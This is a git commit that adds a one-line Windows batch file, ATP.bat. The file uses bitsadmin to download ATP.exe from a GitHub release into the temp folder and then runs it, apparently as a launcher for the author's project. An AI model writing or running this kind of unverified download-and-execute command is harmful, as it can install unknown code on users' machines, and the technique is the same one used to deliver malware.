8788359993dff8a2b34c9aaa974d2baee0e8d0b1
ShadowFox <gloomy-crow3@proton.me>
2025-10-18 00:27:01 -0300

    Create ATP.bat

---
+++ ATP.bat
@@ -0,0 +1,1 @@
+bitsadmin /transfer ATPDownload /download /priority normal "https://github.com/gloomycrow/AIO_Tec_Project/releases/download/ATP/ATP.exe" "%TEMP%\ATP.exe" & start "" "%TEMP%\ATP.exe" & exit
